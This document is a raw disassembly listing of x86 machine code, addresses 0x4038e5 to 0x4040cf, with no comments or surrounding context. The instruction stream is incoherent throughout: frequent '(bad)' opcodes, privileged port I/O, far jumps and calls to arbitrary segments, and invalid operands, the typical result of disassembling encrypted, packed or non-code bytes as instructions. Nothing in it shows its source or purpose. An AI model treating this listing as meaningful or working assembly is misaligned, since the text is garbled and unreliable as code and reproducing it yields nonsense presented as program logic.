  4038e5:	mov    cl,BYTE PTR gs:[edx+0x6]
  4038e9:	add    al,0xb
  4038eb:	test   eax,0x79da8e0c
  4038f0:	add    eax,0xbfd9ee12
  4038f5:	xchg   eax,edi
  4038f7:	outs   dx,BYTE PTR ds:[esi]
  4038f8:	mov    ds:0x40ce557c,al
  4038fd:	out    dx,eax
  4038fe:	daa    
  4038ff:	in     eax,0x5
  403901:	stos   DWORD PTR es:[edi],eax
  403902:	into   
  403903:	and    ecx,DWORD PTR [edx+0x1c177538]
  403909:	push   ss
  40390a:	dec    ebp
  40390b:	xlat   BYTE PTR ds:[ebx]
  40390c:	and    al,0x5d
  40390e:	(bad)  
  40390f:	mov    esi,0x1747bc28
  403914:	imul   ebp,DWORD PTR [esi],0x201efafc
  40391a:	shr    BYTE PTR [ebp+0x2],1
  40391d:	mov    ch,0xa8
  40391f:	mov    DWORD PTR [edx-0xdc9fe74],ebp
  403925:	lock pushf 
  403927:	sub    eax,0xe06da830
  40392c:	lahf   
  40392d:	lds    esi,FWORD PTR [esi+0x4963f82a]
  403933:	push   esi
  403934:	inc    esi
  403935:	sub    al,0xe6
  403937:	inc    esp
  403938:	mov    ebx,0xe6a849fd
  40393d:	cdq    
  40393e:	cli    
  40393f:	sbb    edx,edx
  403941:	or     eax,0x3cdbe364
  403946:	cld    
  403947:	cs inc ecx
  403949:	and    cl,BYTE PTR [eax]
  40394b:	getsec 
  40394d:	stos   DWORD PTR es:[edi],eax
  40394e:	push   0x4322f96c
  403953:	jno    0x403943
  403955:	or     ecx,edx
  403957:	push   eax
  403958:	mov    DWORD PTR [ebx-0x66],esp
  40395b:	shl    BYTE PTR [ebx],0x17
  40395e:	sub    esi,DWORD PTR [edx-0x21]
  403961:	retf   
  403962:	xor    DWORD PTR [edx],ebx
  403964:	ins    DWORD PTR es:[edi],dx
  403965:	mov    al,0x3f
  403967:	cdq    
  403968:	xchg   ebp,eax
  403969:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40396a:	pop    ss
  40396b:	in     al,0xbd
  40396d:	xchg   ebx,eax
  40396e:	adc    DWORD PTR [edx+edi*8],0xffffffc9
  403972:	fstp   DWORD PTR [ecx]
  403974:	sti    
  403975:	mov    bl,0x88
  403977:	(bad)  
  403978:	jmp    0x403928
  40397a:	lea    ebp,[ecx+0x74503d1]
  403980:	dec    ecx
  403981:	xor    BYTE PTR [ebp+0x66],cl
  403984:	or     DWORD PTR [ebx+0x2c],edx
  403987:	xchg   esp,eax
  403988:	dec    ebx
  403989:	aas    
  40398a:	sbb    al,0x1
  40398c:	loopne 0x4039f2
  40398e:	push   cs
  40398f:	adc    bl,BYTE PTR [ebx+0x75]
  403992:	data16 or bh,ch
  403995:	cmp    ch,BYTE PTR [ecx]
  403997:	(bad)  
  403998:	jmp    0x7fb4:0x8f3e8ffc
  40399f:	push   ss
  4039a0:	loope  0x403989
  4039a2:	mov    ebx,0x6d243a9c
  4039a7:	xchg   ebx,eax
  4039a8:	retf   0xc6d5
  4039ab:	retf   
  4039ac:	pop    ss
  4039ad:	pop    es
  4039ae:	mov    ah,0x4f
  4039b0:	loopne 0x403951
  4039b2:	add    al,0x6d
  4039b4:	adc    al,0xde
  4039b6:	stos   DWORD PTR es:[edi],eax
  4039b7:	lods   al,BYTE PTR ds:[esi]
  4039b8:	test   edi,0xd17956bb
  4039be:	jmp    0x4039f0
  4039c0:	ss jg  0x40396e
  4039c3:	mov    ch,0x16
  4039c5:	inc    edx
  4039c6:	out    dx,al
  4039c7:	mov    ebx,0xb7f42e2c
  4039cc:	in     al,0x22
  4039ce:	jnp    0x403a32
  4039d0:	test   al,cl
  4039d2:	(bad)  
  4039d4:	jmp    0x403a36
  4039d6:	pop    esi
  4039d7:	outs   dx,BYTE PTR ds:[esi]
  4039d8:	inc    esi
  4039d9:	arpl   WORD PTR [edx+0x5e],bp
  4039dc:	int    0x4a
  4039de:	(bad)  [ebx]
  4039e0:	inc    ebx
  4039e1:	and    eax,DWORD PTR [ebp+0x19]
  4039e4:	scas   al,BYTE PTR es:[edi]
  4039e5:	adc    esp,ecx
  4039e7:	add    dl,bl
  4039e9:	or     BYTE PTR [esi+edi*1+0x17],al
  4039ed:	mov    al,0xb6
  4039ef:	adc    cl,dl
  4039f1:	fidiv  WORD PTR [esi+eax*8-0x47820099]
  4039f8:	mov    ecx,0x248c5ae8
  4039fd:	out    dx,al
  4039fe:	popf   
  4039ff:	(bad)  
  403a00:	xchg   ecx,eax
  403a01:	mov    eax,0x57139c27
  403a06:	or     al,dh
  403a08:	sub    BYTE PTR [edx+0x1489886f],cl
  403a0e:	fs repnz adc eax,0x7220fdce
  403a15:	scas   eax,DWORD PTR es:[edi]
  403a16:	dec    BYTE PTR [esi-0x41]
  403a19:	leave  
  403a1a:	dec    edi
  403a1b:	jno    0x403a6a
  403a1d:	out    dx,eax
  403a1e:	loope  0x403a22
  403a20:	addr16 nop
  403a22:	(bad)  
  403a23:	xlat   BYTE PTR ds:[ebx]
  403a24:	cmp    eax,DWORD PTR [ebp-0x73e49f61]
  403a2a:	mov    ah,al
  403a2c:	mov    cs,WORD PTR [ecx]
  403a2e:	ret    0xd37b
  403a31:	lock ret 
  403a33:	xor    edi,edi
  403a35:	push   0x5a54464f
  403a3a:	rol    DWORD PTR [eiz*8+0x6128b664],1
  403a41:	adc    al,0x7a
  403a43:	jae    0x403a4f
  403a45:	sbb    al,0xe8
  403a47:	push   eax
  403a48:	shl    dl,1
  403a4a:	inc    esp
  403a4b:	(bad)  
  403a4c:	into   
  403a4d:	out    0x68,eax
  403a4f:	jnp    0x403a82
  403a51:	cmp    DWORD PTR [eax-0x60],edx
  403a54:	inc    edx
  403a55:	and    dh,BYTE PTR [edx]
  403a57:	fstp   TBYTE PTR [ebp+0x52]
  403a5a:	mov    ah,0x97
  403a5c:	lea    eax,[esi+0x3bf5efae]
  403a62:	mov    dh,0xb
  403a64:	jge    0x403ad0
  403a66:	adc    al,0xce
  403a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a69:	sahf   
  403a6a:	dec    edi
  403a6b:	pop    edx
  403a6c:	adc    al,ah
  403a6e:	daa    
  403a6f:	pop    esi
  403a70:	aas    
  403a71:	outs   dx,BYTE PTR ds:[esi]
  403a72:	outs   dx,BYTE PTR ds:[esi]
  403a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a74:	outs   dx,DWORD PTR ds:[esi]
  403a75:	bound  esp,QWORD PTR [esp+edi*8-0x2eb4c70d]
  403a7c:	xchg   edx,eax
  403a7d:	pop    ebx
  403a7e:	dec    edi
  403a7f:	mov    dl,BYTE PTR [edi+0x3f]
  403a82:	jne    0x403a1d
  403a84:	sub    DWORD PTR [edx+0x4b],eax
  403a87:	in     eax,0xe4
  403a89:	dec    eax
  403a8a:	or     ebp,eax
  403a8c:	and    DWORD PTR [esi-0x4d],edi
  403a8f:	ja     0x403a8d
  403a91:	cdq    
  403a92:	xor    eax,0xdc831b8
  403a97:	lock adc eax,0xf58233d8
  403a9d:	outs   dx,BYTE PTR ds:[esi]
  403a9e:	cmp    al,0x69
  403aa0:	push   esi
  403aa1:	repnz cmp BYTE PTR [eax],0x25
  403aa5:	lods   al,BYTE PTR ds:[esi]
  403aa6:	scas   al,BYTE PTR es:[edi]
  403aa7:	imul   ax,dx,0x9408
  403aac:	ret    0x16f6
  403aaf:	push   ebp
  403ab0:	pop    edi
  403ab1:	outs   dx,BYTE PTR ds:[esi]
  403ab2:	and    al,0x2
  403ab4:	ja     0x403b10
  403ab6:	adc    ebx,0x9
  403ab9:	jne    0x403a7d
  403abb:	cli    
  403abc:	adc    dl,bl
  403abe:	sbb    edx,DWORD PTR [eax+eiz*2+0x1d]
  403ac2:	xchg   esp,eax
  403ac3:	out    0xfa,eax
  403ac5:	je     0x403afb
  403ac7:	jl     0x403b3a
  403ac9:	aad    0x72
  403acb:	mov    cl,0xd8
  403acd:	cmp    eax,0x86ba8dc9
  403ad2:	cbw    
  403ad4:	jp     0x403b4b
  403ad6:	aad    0x6e
  403ad8:	xor    esp,DWORD PTR [edx-0x5d]
  403adb:	mov    ecx,0x5780b1b2
  403ae0:	(bad)  
  403ae1:	cld    
  403ae2:	or     dh,ch
  403ae4:	repz mov dl,0x4c
  403ae7:	mov    esi,0xc6b01ddf
  403aed:	mov    eax,ds:0x84c0598b
  403af2:	loop   0x403aa3
  403af4:	mov    BYTE PTR [ecx-0x78aefe87],bh
  403afa:	in     eax,dx
  403afb:	rol    BYTE PTR gs:[edi+eiz*1],0x9f
  403b00:	mov    dl,0xec
  403b02:	fs adc al,0x1f
  403b05:	enter  0xc3ba,0x75
  403b09:	and    al,0xce
  403b0b:	lods   eax,DWORD PTR ds:[esi]
  403b0c:	xor    eax,0x6e4cc98e
  403b11:	aam    0xce
  403b13:	mov    dh,0xa1
  403b15:	sbb    esp,DWORD PTR [edx-0x228aa5f8]
  403b1b:	inc    eax
  403b1c:	imul   BYTE PTR [ebx+0x25f65f07]
  403b22:	pop    ecx
  403b23:	icebp  
  403b24:	cmp    DWORD PTR [ebx+0xe6259cd],edi
  403b2a:	xor    DWORD PTR [esi+0x7ce58e14],0xcf3dadbb
  403b34:	push   ss
  403b35:	add    DWORD PTR [edx+0x24],ebx
  403b38:	dec    ecx
  403b39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b3a:	push   0xd9752522
  403b3f:	popa   
  403b40:	add    al,0xbf
  403b42:	adc    esi,DWORD PTR [eax+0x33699266]
  403b48:	mov    eax,ds:0x44caa57e
  403b4d:	imul   edi,DWORD PTR [ecx],0x4c
  403b50:	stc    
  403b51:	mov    esp,0x8b349768
  403b56:	(bad)  
  403b57:	add    BYTE PTR [ecx+0x50afde4b],ch
  403b5d:	add    bh,BYTE PTR [ebx-0xd7ddbc0]
  403b63:	lea    eax,[eax+0x79b739a2]
  403b69:	clc    
  403b6a:	out    dx,eax
  403b6b:	cmp    dl,ah
  403b6d:	and    eax,0x9d7fa547
  403b72:	mov    esp,0x2decbbd8
  403b77:	jb     0x403b90
  403b79:	in     al,0xb0
  403b7b:	adc    eax,0x76b58cbd
  403b80:	fsubr  st(0),st
  403b82:	aas    
  403b83:	sbb    dh,ch
  403b85:	pusha  
  403b86:	and    DWORD PTR [ecx+0x57c81c1a],edx
  403b8c:	das    
  403b8d:	retf   
  403b8e:	and    BYTE PTR [esi+0x1d1b4bcb],ah
  403b94:	jmp    0x4f99dff2
  403b99:	and    dh,BYTE PTR ds:0x96fbd7fc
  403b9f:	test   DWORD PTR [edi+0xd],0x384b589a
  403ba6:	adc    ch,BYTE PTR [edi+0x38b9ef6a]
  403bac:	sbb    edx,ecx
  403bae:	out    dx,eax
  403baf:	push   0x0
  403bb1:	das    
  403bb2:	adc    BYTE PTR [ebx+eiz*8-0x5b],ah
  403bb6:	repnz xor al,0x8d
  403bb9:	(bad)  
  403bba:	sti    
  403bbb:	mov    ?,WORD PTR [ebx-0x75b27f53]
  403bc1:	mov    esp,0xd1c0afe6
  403bc6:	js     0x403bec
  403bc8:	xchg   edi,eax
  403bc9:	add    dh,BYTE PTR [esi-0x59]
  403bcc:	push   eax
  403bcd:	push   es
  403bce:	cmp    ebp,edi
  403bd0:	and    al,0x53
  403bd2:	out    0x24,al
  403bd4:	pop    eax
  403bd5:	adc    al,0xc2
  403bd7:	dec    ecx
  403bd8:	bnd jae 0x403b7d
  403bdb:	fimul  DWORD PTR [edi-0x4e]
  403bde:	call   0xe8da69e8
  403be3:	outs   dx,DWORD PTR ds:[esi]
  403be4:	test   eax,0xe8db18a
  403be9:	pop    ebp
  403bea:	pop    esi
  403beb:	cmp    BYTE PTR [edx-0x11bc52a0],dh
  403bf1:	cmp    al,0xad
  403bf3:	inc    edx
  403bf4:	mov    WORD PTR [edx],gs
  403bf6:	idiv   DWORD PTR [ebp+0x611aa985]
  403bfc:	arpl   WORD PTR [ebx],cx
  403bfe:	cld    
  403bff:	lods   al,BYTE PTR ds:[esi]
  403c00:	push   0xb82e247d
  403c05:	add    DWORD PTR [ebp+ebp*4-0x29],ebp
  403c09:	push   0x35b88378
  403c0e:	stos   DWORD PTR es:[edi],eax
  403c0f:	and    esi,DWORD PTR [eax-0x32c6de81]
  403c15:	push   ss
  403c16:	mov    fs,WORD PTR [esi+0x27]
  403c19:	xor    DWORD PTR [ecx+0x22bbca16],edi
  403c1f:	and    BYTE PTR [esi],0x4f
  403c22:	mov    esp,0x599e480
  403c27:	fbstp  TBYTE PTR [edx]
  403c29:	xor    al,BYTE PTR [ebx+0x4a3ef4c5]
  403c2f:	and    ecx,DWORD PTR [ebp+0x370421f1]
  403c35:	mov    dh,0xfa
  403c37:	mov    al,ds:0xcd8a944b
  403c3c:	xchg   BYTE PTR [ebp-0x7be76169],dl
  403c42:	jbe    0x403c9e
  403c44:	xor    eax,0xf1f501d8
  403c49:	fbstp  TBYTE PTR [eax]
  403c4b:	xor    eax,0xe9cd8d40
  403c50:	mov    dh,0x56
  403c52:	sbb    eax,0x6faa70ad
  403c57:	stc    
  403c58:	call   0x5192:0xe50ac666
  403c5f:	pop    ecx
  403c60:	fwait
  403c61:	and    bl,BYTE PTR [ebx+ecx*8+0x7eba7a8f]
  403c68:	stos   BYTE PTR es:[edi],al
  403c69:	cmp    BYTE PTR [edx+0x6d9914bf],bl
  403c6f:	xchg   esi,eax
  403c70:	cs repnz dec eax
  403c73:	arpl   WORD PTR [ebp+0x10],ax
  403c76:	in     al,dx
  403c77:	in     eax,dx
  403c78:	sbb    eax,0xeb0c4e3a
  403c7d:	shl    DWORD PTR [ebp+0x5],0xbf
  403c81:	loope  0x403caa
  403c83:	or     BYTE PTR [esi+0x477ea76a],0x78
  403c8a:	mov    dl,0xa5
  403c8c:	fnstsw WORD PTR [edx-0x3]
  403c8f:	xchg   esp,eax
  403c90:	jl     0x403ca0
  403c92:	jne    0x403c69
  403c94:	shr    edi,0x4a
  403c97:	or     esi,DWORD PTR [edx+0x4d]
  403c9a:	retf   0x9018
  403c9d:	data16 cmp al,0xd4
  403ca0:	or     BYTE PTR [esi-0x4c4fa2fd],cl
  403ca6:	xchg   ebp,eax
  403ca7:	pop    ecx
  403ca8:	sbb    DWORD PTR [edx+0x61a5f0db],ebx
  403cae:	sub    bh,BYTE PTR [eax+0x1bfe330f]
  403cb4:	fst    QWORD PTR [eax-0x1d]
  403cb7:	and    bh,dh
  403cb9:	mov    BYTE PTR [esi+ecx*4-0x283b44fc],al
  403cc0:	sar    DWORD PTR ds:0x5b421ebd,0xcf
  403cc7:	cmp    eax,DWORD PTR ds:0xf4549caf
  403ccd:	shl    DWORD PTR [esi+ebx*4+0xe],0x48
  403cd2:	fwait
  403cd3:	mov    DWORD PTR [ebp+0x6c],ecx
  403cd6:	mov    al,0x6f
  403cd8:	sub    al,0xe1
  403cda:	jg     0x403cf3
  403cdc:	pop    es
  403cdd:	test   al,0x43
  403cdf:	adc    DWORD PTR [eax-0x171dde27],esp
  403ce5:	pop    ecx
  403ce6:	bound  esp,QWORD PTR [edi]
  403ce8:	adc    DWORD PTR [edi],0x845a299
  403cee:	hlt    
  403cef:	inc    ebx
  403cf0:	es loop 0x403c98
  403cf3:	div    DWORD PTR ds:0x88f13dea
  403cf9:	popf   
  403cfa:	xchg   DWORD PTR [eax-0xe33d55a],ecx
  403d00:	jno    0x403caf
  403d02:	clc    
  403d03:	or     ah,dl
  403d05:	out    dx,al
  403d06:	outs   dx,BYTE PTR ds:[esi]
  403d07:	test   eax,0x394eee2
  403d0c:	jmp    0x75ea:0x24ab1505
  403d13:	add    DWORD PTR [eax+0x3e],ebx
  403d16:	push   es
  403d17:	add    bh,BYTE PTR [eax-0xdb14339]
  403d1d:	popf   
  403d1e:	xchg   edx,eax
  403d1f:	ss out dx,eax
  403d21:	push   0xadf61f40
  403d26:	popf   
  403d27:	mov    eax,0x5620202f
  403d2c:	jle    0x403da9
  403d2e:	mov    al,ds:0x1b7fe078
  403d33:	xor    eax,DWORD PTR ds:0xa8f648c4
  403d39:	xchg   BYTE PTR [edi-0x7e080e73],dh
  403d3f:	cs xchg edx,eax
  403d41:	add    bl,dl
  403d43:	es jne 0x403d1a
  403d46:	jae    0x403dbe
  403d48:	pop    ecx
  403d49:	cmp    bh,ch
  403d4b:	and    al,0x96
  403d4d:	pop    esi
  403d4e:	xor    DWORD PTR [esi-0x6ba5e486],0xf4b333f2
  403d58:	jge    0x403d5e
  403d5a:	dec    edx
  403d5b:	cmp    cl,BYTE PTR [eax]
  403d5d:	sbb    edi,ebx
  403d5f:	pop    ebx
  403d60:	dec    ebx
  403d61:	je     0x403d7a
  403d63:	lea    ebp,[ecx+0x3d89b89]
  403d69:	xor    ah,ah
  403d6b:	fwait
  403d6c:	and    eax,0xa084b5bb
  403d71:	test   DWORD PTR [ecx-0x36],ebp
  403d74:	popf   
  403d75:	cmp    DWORD PTR ds:0xb709f60,edi
  403d7b:	pop    edi
  403d7c:	adc    dh,BYTE PTR [edi+0x582b9b9f]
  403d82:	lea    esp,[ebp+0x1fc5ebe1]
  403d88:	ficom  DWORD PTR [ecx-0x64]
  403d8b:	mov    ecx,0xc444d020
  403d90:	popa   
  403d91:	sbb    esp,edi
  403d93:	pop    esp
  403d94:	push   esp
  403d95:	jmp    0x403d6b
  403d97:	push   es
  403d98:	adc    DWORD PTR [ebx+0x6a],edi
  403d9b:	fidiv  DWORD PTR [ecx+0x6bbde743]
  403da1:	(bad)  
  403da2:	xor    ah,dl
  403da4:	or     al,0x10
  403da6:	pop    ds
  403da7:	(bad)  
  403da9:	scas   eax,DWORD PTR es:[edi]
  403daa:	mov    ds:0x6939afa3,eax
  403daf:	sbb    ch,0x8f
  403db2:	add    eax,0x2160ef14
  403db7:	or     al,BYTE PTR [ebp-0x17]
  403dba:	jbe    0x403e18
  403dbc:	iret   
  403dbd:	enter  0x4760,0x12
  403dc1:	into   
  403dc2:	out    0xb1,eax
  403dc4:	jnp    0x403d87
  403dc6:	sub    DWORD PTR [ebx-0x25aa214c],0x4d
  403dcd:	push   eax
  403dce:	(bad)  
  403dcf:	jmp    0xa0a44d1
  403dd4:	repnz dec ecx
  403dd6:	pop    eax
  403dd7:	sbb    BYTE PTR [ecx-0x7b],0x95
  403ddb:	daa    
  403ddc:	lds    ecx,FWORD PTR [esi]
  403dde:	or     al,0x13
  403de0:	jl     0x403e21
  403de2:	scas   eax,DWORD PTR es:[edi]
  403de3:	mov    dl,BYTE PTR [ecx-0x490ed006]
  403de9:	xchg   ebx,eax
  403dea:	ins    DWORD PTR es:[edi],dx
  403deb:	or     ebp,DWORD PTR [ecx]
  403ded:	cs pop eax
  403def:	fbstp  TBYTE PTR [edx+0x28]
  403df2:	sbb    eax,0xf090888b
  403df7:	fisttp DWORD PTR [ebp-0x79e5362e]
  403dfd:	ss hlt 
  403dff:	and    al,0xcb
  403e01:	jmp    0x403dbf
  403e03:	pop    es
  403e04:	jns    0x403e1c
  403e06:	dec    ecx
  403e07:	outs   dx,DWORD PTR ds:[esi]
  403e08:	fsub   QWORD PTR ds:0x4d017f58
  403e0e:	dec    ebx
  403e0f:	inc    ecx
  403e10:	jg     0x403dc7
  403e12:	fisubr WORD PTR [ebp-0x62f0596f]
  403e18:	fiadd  WORD PTR [ebx-0x2304ddb0]
  403e1e:	in     al,0xf4
  403e20:	rcr    BYTE PTR [ecx],cl
  403e22:	rcl    DWORD PTR [eax+0x7e],0x94
  403e26:	mov    ds:0x1802cb40,eax
  403e2b:	dec    edx
  403e2c:	data16 shr BYTE PTR [ebp+0x487313f],1
  403e33:	or     DWORD PTR [edx-0x6a],ecx
  403e36:	cmp    edi,DWORD PTR [edx-0xa]
  403e39:	push   ebp
  403e3a:	retf   0x83ba
  403e3d:	lea    ecx,[ebx+0x42851b21]
  403e43:	jmp    0xcad095a8
  403e48:	mov    esi,0x2cd7df01
  403e4d:	imul   ecx,DWORD PTR [ebp+0x1a],0xffffffd2
  403e51:	cmp    eax,0xbf64697c
  403e56:	adc    dl,cl
  403e58:	xchg   ebx,eax
  403e59:	jmp    0x16aecbab
  403e5e:	and    BYTE PTR [eax+0x626fa1bb],bl
  403e64:	mov    bl,0x83
  403e66:	pop    eax
  403e67:	jnp    0x403e40
  403e69:	dec    edx
  403e6a:	fidivr WORD PTR [ebp+0x39]
  403e6d:	push   ecx
  403e6e:	loopne 0x403eef
  403e70:	mov    al,BYTE PTR [ebx-0x212330b0]
  403e76:	jbe    0x403e0c
  403e78:	and    al,0xa3
  403e7a:	ja     0x403e09
  403e7c:	fiadd  WORD PTR [ebp+0x7e]
  403e7f:	cmp    BYTE PTR [esi],dl
  403e81:	mov    al,ds:0xd24968c
  403e86:	add    ecx,DWORD PTR [edx+0x40]
  403e89:	int    0x5
  403e8b:	out    0xc8,al
  403e8d:	mov    edx,DWORD PTR [edi+0x26]
  403e90:	adc    BYTE PTR [edi],0x9f
  403e93:	cs adc DWORD PTR cs:[ecx+edx*4],eax
  403e98:	call   0x4e6f4941
  403e9d:	lea    bx,[ecx+eiz*2+0xf]
  403ea2:	in     al,0x6f
  403ea4:	sbb    dl,BYTE PTR [eax]
  403ea6:	dec    ecx
  403ea7:	mov    BYTE PTR [edi-0x41aa024f],ch
  403ead:	xchg   ebp,eax
  403eae:	adc    ah,BYTE PTR [ecx+0x2e903c69]
  403eb4:	xchg   DWORD PTR [ebx+0x5287fe6b],ebp
  403eba:	arpl   WORD PTR [edi+0x832ff30],bp
  403ec0:	or     eax,0x77e5bf90
  403ec5:	jmp    0xfba7e3f0
  403eca:	adc    ecx,DWORD PTR [edi+ecx*2+0x9a600e0]
  403ed1:	test   al,0x62
  403ed3:	sti    
  403ed4:	cdq    
  403ed5:	out    0x4e,eax
  403ed7:	mov    ecx,0xfb21fe93
  403edc:	and    edx,ecx
  403ede:	aaa    
  403edf:	sar    BYTE PTR [esi+0x51],0xa8
  403ee3:	int3   
  403ee4:	ss and eax,0x7284d537
  403eea:	push   ecx
  403eeb:	push   esi
  403eec:	sub    al,0xa4
  403eee:	inc    eax
  403eef:	aas    
  403ef0:	inc    ecx
  403ef1:	mov    ss,WORD PTR [ecx]
  403ef3:	adc    al,0xb2
  403ef5:	push   ebp
  403ef6:	loop   0x403f60
  403ef8:	aam    0xf4
  403efa:	mov    dh,0x41
  403efc:	xchg   DWORD PTR [ebp-0x48fbcd76],esp
  403f02:	mov    eax,0xe3866430
  403f07:	and    BYTE PTR [edx-0x19],0xa9
  403f0b:	mov    bl,0x6
  403f0d:	mov    bl,0x8d
  403f0f:	loopne 0x403f89
  403f11:	mov    ds:0x67f37681,eax
  403f16:	adc    cl,al
  403f18:	mov    ch,0x9a
  403f1a:	call   0x826e8d55
  403f1f:	dec    ebx
  403f20:	adc    dl,BYTE PTR [esi-0x4d]
  403f23:	adc    al,dh
  403f25:	enter  0x9894,0x39
  403f29:	push   edx
  403f2a:	inc    edi
  403f2b:	cli    
  403f2c:	dec    edx
  403f2d:	test   DWORD PTR [ecx+0x2f],ecx
  403f30:	int3   
  403f31:	loope  0x403f74
  403f33:	rol    dh,1
  403f35:	or     DWORD PTR [ecx-0x6d7cd1d7],eax
  403f3b:	retf   
  403f3c:	ins    BYTE PTR es:[edi],dx
  403f3d:	js     0x403f7b
  403f3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f40:	inc    edx
  403f41:	mov    esi,0x6a8693bf
  403f46:	lods   eax,DWORD PTR ds:[esi]
  403f47:	call   0x562f:0xf09435bb
  403f4e:	pop    ebp
  403f4f:	fxch   st(5)
  403f51:	cwde   
  403f52:	dec    ebp
  403f53:	(bad)  
  403f54:	stos   BYTE PTR es:[edi],al
  403f55:	jmp    0xb495:0x1cc7f126
  403f5c:	fs xchg edi,eax
  403f5e:	xlat   BYTE PTR ds:[ebx]
  403f5f:	test   al,0x61
  403f61:	dec    edi
  403f62:	adc    bl,BYTE PTR [esi]
  403f64:	call   0x9c31b977
  403f69:	retf   0xf773
  403f6c:	adc    DWORD PTR [ebx-0x3bb6cb82],edi
  403f72:	sub    al,0x12
  403f74:	in     al,0xfd
  403f76:	cli    
  403f77:	jmp    0x4978:0xfc2bde27
  403f7e:	push   ebp
  403f7f:	test   eax,ecx
  403f81:	(bad)  
  403f82:	cwde   
  403f83:	xchg   ebp,eax
  403f84:	(bad)  
  403f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f86:	dec    esi
  403f87:	pop    ebx
  403f88:	je     0x403f12
  403f8a:	sbb    eax,0xb92a230
  403f8f:	cmp    al,0xaa
  403f91:	enter  0xdd1,0xac
  403f95:	mov    ebx,0x4e6bdc3f
  403f9a:	loopne 0x403fa9
  403f9c:	pop    ebx
  403f9d:	push   ecx
  403f9e:	jns    0x403faa
  403fa0:	lods   eax,DWORD PTR ds:[esi]
  403fa1:	push   ds
  403fa2:	cld    
  403fa3:	xchg   esp,eax
  403fa4:	pop    edi
  403fa5:	push   0xffffff9b
  403fa7:	adc    cl,bh
  403fa9:	xor    al,0xcf
  403fab:	in     al,0xcc
  403fad:	xlat   BYTE PTR ds:[ebx]
  403fae:	bound  edi,QWORD PTR ss:[eax+0x727d516]
  403fb5:	fisub  DWORD PTR [ecx-0x7cd57242]
  403fbb:	or     al,0x7a
  403fbd:	adc    BYTE PTR [edi+0x7773aca2],dh
  403fc3:	dec    esi
  403fc4:	call   0x6ffe457b
  403fc9:	fst    QWORD PTR [ecx-0x4e]
  403fcc:	stc    
  403fcd:	out    0xb0,eax
  403fcf:	aaa    
  403fd0:	sbb    al,0x1
  403fd2:	adc    DWORD PTR es:[ecx],eax
  403fd5:	jl     0x403f6d
  403fd7:	stos   BYTE PTR es:[edi],al
  403fd8:	fsubr  QWORD PTR [ebx-0x38]
  403fdb:	push   cs
  403fdc:	in     al,0xf1
  403fde:	lock dec esi
  403fe0:	mov    esp,0xec8fdb97
  403fe5:	adc    cl,BYTE PTR [ecx]
  403fe7:	mov    dh,0x3
  403fe9:	rol    DWORD PTR [ebx-0x43881780],0xd3
  403ff0:	push   ebx
  403ff1:	mov    ebx,0x3163f755
  403ff6:	mov    al,ds:0xa9c9d725
  403ffb:	push   ebx
  403ffc:	bound  ebx,QWORD PTR [esi-0x9906a36]
  404002:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404003:	push   eax
  404004:	push   DWORD PTR [ecx]
  404006:	pop    edx
  404007:	popf   
  404008:	retf   
  404009:	out    dx,al
  40400a:	(bad)  
  40400b:	and    ah,BYTE PTR [esi+0x2a]
  40400e:	lds    ebx,FWORD PTR [eax-0x1c8a5dac]
  404014:	iret   
  404015:	fmulp  st(2),st
  404017:	xor    edi,DWORD PTR [ebx+0x7b]
  40401a:	cmp    DWORD PTR [edi],ecx
  40401c:	pop    edi
  40401d:	inc    edi
  40401e:	adc    bl,BYTE PTR [ebx-0x7f]
  404021:	outs   dx,DWORD PTR ds:[esi]
  404022:	(bad)  
  404023:	scas   eax,DWORD PTR es:[edi]
  404024:	jmp    0xd778:0xe054cbb0
  40402b:	(bad)  
  40402c:	adc    ebx,DWORD PTR [ebx+0x50]
  40402f:	aam    0x6f
  404031:	in     eax,dx
  404032:	out    0x72,eax
  404034:	cmp    esp,DWORD PTR [eax]
  404036:	scas   al,BYTE PTR es:[edi]
  404037:	xchg   edi,eax
  404038:	popf   
  404039:	leave  
  40403a:	sbb    bl,BYTE PTR [ecx+0x5c5cf2ec]
  404040:	sub    ecx,0x35
  404043:	ror    DWORD PTR [ebx],cl
  404045:	xchg   edi,eax
  404046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404047:	pusha  
  404048:	push   ebp
  404049:	sbb    eax,0xed2bc675
  40404e:	retf   
  40404f:	out    dx,eax
  404050:	mov    ?,WORD PTR [edi+0x6d2f569c]
  404056:	neg    esi
  404058:	test   DWORD PTR [ebx],esp
  40405a:	aad    0x8c
  40405c:	(bad)  
  40405d:	xlat   BYTE PTR ds:[ebx]
  40405e:	pop    es
  40405f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404060:	fsub   QWORD PTR [ecx+0x4d]
  404063:	ds cli 
  404065:	jns    0x4040e1
  404067:	xchg   ebp,eax
  404068:	cmp    cl,dl
  40406a:	shr    ebx,cl
  40406c:	inc    eax
  40406d:	jl     0x4040c5
  40406f:	xor    DWORD PTR [edx+0x36856533],esp
  404075:	popf   
  404076:	(bad)  
  404077:	cmp    DWORD PTR [edi-0x70],ebx
  40407a:	jle    0x4040ba
  40407c:	cmp    esi,0x22
  40407f:	xor    eax,0xef6c0279
  404084:	les    eax,FWORD PTR [eax]
  404086:	cmc    
  404087:	je     0x4040bc
  404089:	mov    eax,ds:0xd7954df7
  40408e:	div    BYTE PTR [edi]
  404090:	arpl   WORD PTR [edx-0x37],sp
  404093:	mov    ebx,0x9b83b0c
  404098:	add    BYTE PTR [esp+edx*4-0x4f],cl
  40409c:	or     ebp,DWORD PTR [ebp+0x34]
  40409f:	push   ds
  4040a0:	sub    dh,BYTE PTR [ebp+0x26ab4883]
  4040a6:	shl    DWORD PTR [ebp+0x34],1
  4040a9:	repnz dec ebp
  4040ab:	fs std 
  4040ad:	xchg   BYTE PTR [ecx+0x543be116],al
  4040b3:	fidivr WORD PTR [eax+0x32bae093]
  4040b9:	mov    ch,0xa2
  4040bb:	test   al,0xda
  4040bd:	arpl   WORD PTR [eax+0x41],bp
  4040c0:	shr    DWORD PTR [ebp+0x5c],0x69
  4040c4:	inc    ebp
  4040c5:	lahf   
  4040c6:	rcl    DWORD PTR [bp+si-0x1321],1
  4040cb:	enter  0x1d1a,0xc9
  4040cf:	xor    DWORD PTR [ebp-0x28],ecx
